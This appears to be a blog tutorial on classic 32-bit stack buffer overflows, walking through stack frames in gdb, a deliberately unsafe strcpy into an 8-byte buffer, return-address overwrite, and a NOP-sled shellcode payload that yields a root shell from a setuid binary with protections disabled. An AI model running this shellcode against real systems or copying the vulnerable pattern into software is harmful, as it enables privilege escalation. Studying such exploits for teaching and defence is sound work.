---
layout: post
title: bufferoverflow
excerpt: "A look at how buffer overflows work and some mitigation techniques."
categories: [tech]
tags: [itsec, howto]
comments: false
---

To follow this post you may need a modicum of C know-how as well as some familiarity with `gdb`. In regards to compile flags, we're using `-g` to include debugging information (which will be used by `gdb`) and `-m32` to compile to 32 bits (I'm using a 64 bits machine and you're probably too) - but 32 bit is easier to understand. 

I'll also be using the `-fno-stack-protector` option which is enabled by default on modern versions of `gdb` and ALSR has been disabled via `sudo echo 0 | tee /proc/sys/kernel/randomize_va_space`.

## The call stack

In C, when a function calls another, a number of things are placed on the stack - including the arguments passed to the callee as well as the return address of the caller. Let's see this in action with a contrived example (we're using unsigned integers because on this platform those are 4 bytes wide, so 32 bits - making them easy to see when we're looking at the stack).

~~~ c
#include <stdio.h>

int
myfunc(unsigned int a, unsigned int b)
{
        unsigned int result = 0xCCCCCCCC;
        unsigned int unused = 0xDDDDDDDD;
        result = a + b;
        return result;
}

        int
main()
{
        unsigned int result = 0xEEEEEEEE;
        unsigned int a = 0xAAAAAAAA;
        unsigned int b = 0xBBBBBBBB;
        result = myfunc(a, b);
        printf("Result: %d\n", result);
        return 0;
}
~~~

Compiling:

~~~ shell
vagrant@vagrant:/tmp$ gcc -g -m32 -fno-stack-protector foo.c
vagrant@vagrant:/tmp$ ./a.out
Result: 1717986917
~~~

Let's fire up `gdb` and look at the stack fore and after the call to `myfunc`.

~~~ shell
vagrant@vagrant:/tmp$ gdb -q ./a.out
Reading symbols from ./a.out...done.
(gdb) list main
9         return result;
10      }
11
12      int
13      main()
14      {
15        unsigned int result = 0xEEEEEEEE;
16        unsigned int a = 0xAAAAAAAA;
17        unsigned int b = 0xBBBBBBBB;
18        result = myfunc(a, b);
(gdb) break 18
Breakpoint 1 at 0x8048455: file foo.c, line 18.
(gdb) break myfunc
Breakpoint 2 at 0x8048411: file foo.c, line 6.
(gdb) run
Starting program: /tmp/a.out

Breakpoint 1, main () at foo.c:18
18        result = myfunc(a, b);
(gdb) i r $ebp
ebp            0xffffdba8       0xffffdba8
~~~

The value of the base pointer prior to the call is `0xffffdba8`. We continue, breaking into `myfunc`.

~~~ shell
(gdb) c
Continuing.

Breakpoint 2, myfunc (a=2863311530, b=3149642683) at foo.c:6
6         unsigned int result = 0xCCCCCCCC;
(gdb) i r $ebp
ebp            0xffffdb80       0xffffdb80
(gdb) i r $esp
esp            0xffffdb70       0xffffdb70
(gdb) p $ebp-$esp
$2 = 16
(gdb) x/16wx $esp
0xffffdb70:     0x00008000      0xf7fc2000      0xf7fc0244      0xf7e2a0ec
0xffffdb80:     0xffffdba8      0x08048460      0xaaaaaaaa      0xbbbbbbbb
0xffffdb90:     0x00000001      0xbbbbbbbb      0xaaaaaaaa      0xeeeeeeee
0xffffdba0:     0xf7fc23dc      0xffffdbc0      0x00000000      0xf7e2a637
~~~

The stack grows towards smaller addresses - and the difference between `ebp` and `esp` is the current size of the stack.

If we look at the contents starting on `0xffffdb80` the first word should look familiar - it's the previous frame's `ebp` (main's). There's another word, and then the two arguments passed to `myfunc` in reverse order (the stack grows from larger to smaller addresses - so `0xbbbbbbbb` was placed first). The value in between of `0xffffdba8` and `0xaaaaaaaa` is nothing more than the return address. That is, where execution should come back to once `myfunc` returns. We can see this more clearly by looking at the assembly code in main

~~~ shell
(gdb) disass main
[...]
        0x08048447 <+24>:    mov    DWORD PTR [ebp-0x10],0xaaaaaaaa
        0x0804844e <+31>:    mov    DWORD PTR [ebp-0x14],0xbbbbbbbb
        0x08048455 <+38>:    push   DWORD PTR [ebp-0x14]
        0x08048458 <+41>:    push   DWORD PTR [ebp-0x10]
        0x0804845b <+44>:    call   0x804840b <myfunc>
        0x08048460 <+49>:    add    esp,0x8
[...]
~~~

That's the address right after the `call` instruction (you'll also note we then discard the lowest 8 bytes with `add esp,0x8`, which accounts for the two local variables).

If we step twice and look at the stack again, we'll see the local variables `0xdddddddd` and `0xcccccccc` right on top of the saved `ebp` value and return address:

~~~ shell
(gdb) step
7         unsigned int unused = 0xDDDDDDDD;
(gdb) step
8         result = a + b;
(gdb) x/16wx $esp
0xffffdb70:     0x00008000      0xf7fc2000      0xdddddddd      0xcccccccc
0xffffdb80:     0xffffdba8      0x08048460      0xaaaaaaaa      0xbbbbbbbb
0xffffdb90:     0x00000001      0xbbbbbbbb      0xaaaaaaaa      0xeeeeeeee
0xffffdba0:     0xf7fc23dc      0xffffdbc0      0x00000000      0xf7e2a637
~~~

The idea behind a buffer overflow is that if we had a way to control what gets stored on the stack, we might be able to override the return address (`0x08048460`) to point to something else.

Let's modify `foo.c` a little to accept user input.

## User input and `strcpy`

In this example we're accepting a user-defined string which we will copy into `buffer`. Let's see what this looks like in `gdb`:

~~~ c
#include <stdio.h>
#include <string.h>

int
myfunc(char* user_input)
{
        unsigned int res = 0xDDDDDDDD;
        char buffer[8];
        strcpy(buffer, user_input);
        return res;
}

int
main(int argc, char* argv[])
{
        unsigned int result = 0xEEEEEEEE;
        char* user_input = argv[1]; // argv[0] is the program name
        result = myfunc(user_input);
        printf("Result: %d\n", result);
        return 0;
}

~~~


We'll be using `U` as user input because `ord('U') = 0x55`, which makes it easy to see (a char is 1 byte so a word will be `0x55555555`).

8 bytes were allocated for `buffer` - but see what happens when you pass in 8 bytes - first *before* `strcpy` and then after.

~~~ shell
vagrant@vagrant:/tmp$ gdb -q ./a.out
Reading symbols from ./a.out...done.
(gdb) list myfunc
warning: Source file is more recent than executable.
1       #include <stdio.h>
2       #include <string.h>
3
4       int
5       myfunc(char* user_input)
6       {
7         unsigned int res = 0xDDDDDDDD;
8         char buffer[8];
9         strcpy(buffer, user_input);
10        return res;
(gdb) break 9
Breakpoint 1 at 0x8048448: file foo.c, line 9.
(gdb) break 10
Breakpoint 2 at 0x804845a: file foo.c, line 10.
(gdb) run UUUUUUUU
Starting program: /tmp/a.out UUUUUUUU

Breakpoint 1, myfunc (user_input=0xffffdd86 "UUUUUUUU") at foo.c:9
9         strcpy(buffer, user_input);
(gdb) x/16wx $esp
0xffffdb50:     0xffffffff      0x0000002f      0xf7e1edc8      0xdddddddd
0xffffdb60:     0x00008000      0xf7fc2000      0xffffdb98      0x0804848d
0xffffdb70:     0xffffdd86      0x00000000      0xf7e40830      0x0804850b
0xffffdb80:     0x00000002      0xffffdc44      0xffffdd86      0xeeeeeeee
~~~

We can quite clearly see the return adress `0x0804848d` followed by the `ebp` followed by space allocated for `buffer` and then our `unused` variable which is `0xdddddddd`.

Just to check:

~~~ shell
(gdb) x/1wx &res
0xffffdb5c:     0xdddddddd
~~~

Now let's continue to the next breakpoint, *after* `strcpy`:

~~~ shell
(gdb) x/16wx $esp
0xffffdb50:     0xffffffff      0x55555555      0x55555555      0xdddddd00
~~~

We clearly see `0x55555555 0x55555555` representing `UUUUUUUU` but somehow `myres` is no longer what it was.

This is because strings in C are terminated by a null byte (`0x00`) and `strcpy` will keep copying until it finds one in the input. Our buffer is only 8 bytes wide so when we pass in 8 U's, it's actually `0x55555555 0x55555555 0x00` (because we're using little endian, we see this displayed on the right). So by overflowing the buffer, we ended up overwriting a local variable - and if we can overwrite that, could we keep going and overwrite the return address?

## Overwriting the return address

In our previous example the return address was `0x0804848d`. Let's add a function that's not called anywhere:

~~~ c
void
hiddenfunc(void)
{
  printf("This is unreachable!\n");
}
~~~

We can find where that function will be in memory using `objdump`:

~~~ shell
vagrant@vagrant:/tmp$ objdump -d -M intel -S a.out | grep hiddenfunc
0804846b <hiddenfunc>:
hiddenfunc(void)
~~~

Let's see if we can override `main`'s return address to this one instead. Note it is passed reversed, again due to this being little endian.

~~~ shell
vagrant@vagrant:/tmp$ gdb -q --args ./a.out $(perl -e 'print "U"x24 . "\x6b\x84\x04\x08"')
Reading symbols from ./a.out...done.
(gdb) list
8       }
9
10      int
11      myfunc(char* user_input)
12      {
13        unsigned int res = 0xDDDDDDDD;
14        char buffer[8];
15        strcpy(buffer, user_input);
16        return res;
17      }
(gdb) break 15
Breakpoint 1 at 0x8048491: file foo.c, line 15.
(gdb) break 16
Breakpoint 2 at 0x80484a3: file foo.c, line 16.
(gdb) r
Starting program: /tmp/a.out UUUUUUUUUUUUUUUUUUUUUUUUk▒

Breakpoint 1, myfunc (user_input=0xffffdd72 'U' <repeats 24 times>, "k\204\004\b") at foo.c:15
15        strcpy(buffer, user_input);
(gdb) x/16wx $esp
0xffffdb40:     0xffffffff      0x0000002f      0xf7e1edc8      0xdddddddd
0xffffdb50:     0x00008000      0xf7fc2000      0xffffdb88      0x080484d6
0xffffdb60:     0xffffdd72      0x00000000      0xf7e40830      0x0804854b
0xffffdb70:     0x00000002      0xffffdc34      0xffffdd72      0xeeeeeeee
(gdb) c
Continuing.
~~~

The memory address we want to override is:

~~~ shell
(gdb) x/wx 0xffffdb5c
0xffffdb5c:     0x080484d6
~~~

Once `strcpy` has been executed, we can indeed see this has been replaced with `0x0804846b`:

~~~ shell

Breakpoint 2, myfunc (user_input=0xffffdd00 "\f") at foo.c:16
16        return res;
(gdb) x/16wx $esp
0xffffdb40:     0xffffffff      0x55555555      0x55555555      0x55555555
0xffffdb50:     0x55555555      0x55555555      0x55555555      0x0804846b
0xffffdb60:     0xffffdd00      0x00000000      0xf7e40830      0x0804854b
0xffffdb70:     0x00000002      0xffffdc34      0xffffdd72      0xeeeeeeee
(gdb) c
Continuing.
This is unreachable!

Program received signal SIGSEGV, Segmentation fault.
0xffffdd00 in ?? ()
~~~

And sure enough the unreachable function is called.

## Executing user-defined code

That was fun but it's a little limiting - ideally we'd like to execute arbitrary code. That is, point to an area of memory which contains something of ours.

That 'something' is shellcode - it's essentially assembly instructions which for the most part will replace the current process with a shell (which will have the effective user's permissions). Writing shellcode is a bit of an artform and I used the one found "Hacking: The Art of Exploitation" . But where do we store it? It needs to be somewhere in memory and we want to point the return address to it.

We could try storing it in the user-defined buffer but with only 8 bytes (and a few extra) it will be difficult. Instead we will look to store this in an environment variable. Indeed, those are stored on the stack:

~~~ shell
vagrant@vagrant:/tmp$ export SHELLCODE="shellcode goes here"
vagrant@vagrant:/tmp$ gdb -q ./a.out
Reading symbols from ./a.out...done.
(gdb) break main
Breakpoint 1 at 0x80484bb: file foo.c, line 22.
(gdb) r
Starting program: /tmp/a.out

Breakpoint 1, main (argc=1, argv=0xffffdc14) at foo.c:22
22        unsigned int result = 0xEEEEEEEE;
(gdb) x/s *environ
0xffffdd54:     "XDG_SESSION_ID=9"
(gdb) x/16s 0xffffdd54
0xffffdd54:     "XDG_SESSION_ID=9"
0xffffdd65:     "SHELLCODE=shellcode goes here"
0xffffdd83:     "TERM=screen-256color"
0xffffdd98:     "SHELL=/bin/bash"
[...]
~~~

We can see the first environment variable starts at `0xffffdd54` and our `SHELLCODE` one is right under.

In practice we can't rely on our shellcode always being there. The stack will look a little different when the program is being run directly than through `gdb` and this  is where the `NOP` sled comes in. `NOP` is an instruction that does nothing - the program counter will keep incrementing until it finds a valid instruction. By prepending our shellcode with a `NOP` sled, we only need to point to anywhere in that sled to hit our goal.

~~~ shell
vagrant@vagrant:/tmp$ export SHELLCODE=$(perl -e 'print "\x90"x200 . "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80"')
~~~

Our `NOP` sled is 200 bytes long. And sure enough:

~~~ shell
vagrant@vagrant:/tmp$ gcc -g -m32 -fno-stack-protector -z execstack foo.c
vagrant@vagrant:/tmp$ sudo chown root:root a.out
vagrant@vagrant:/tmp$ sudo chmod u+s a.out
vagrant@vagrant:/tmp$ id -u
1000
vagrant@vagrant:/tmp$ ./a.out $(perl -e 'print "U"x24 . "\x54\xdd\xff\xff"')
# id -u
0
~~~

Note the use of `z execstack` to make the stack executable - otherwise you'll get a segmentation fault.

Usually we may not know how many bytes you need to set to overwrite the return address. When that's the case, the below can work just as well:

~~~ shell
vagrant@vagrant:/tmp$ ./a.out $(perl -e 'print "\x54\xdd\xff\xff"x40')
# id -u
0
~~~

That is, we plaster the return address all over the stack in the hope it gets processed correctly.

## Conclusion

Exploiting the stack through buffer overflows has become harder. A number of mitigation techniques (such as non-executable stack, stack protection and address space layout randomisation) are now turned on by default - though the idea is still very much applicable.

The golden reference for this is Elias Levy's timeless article, [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html).
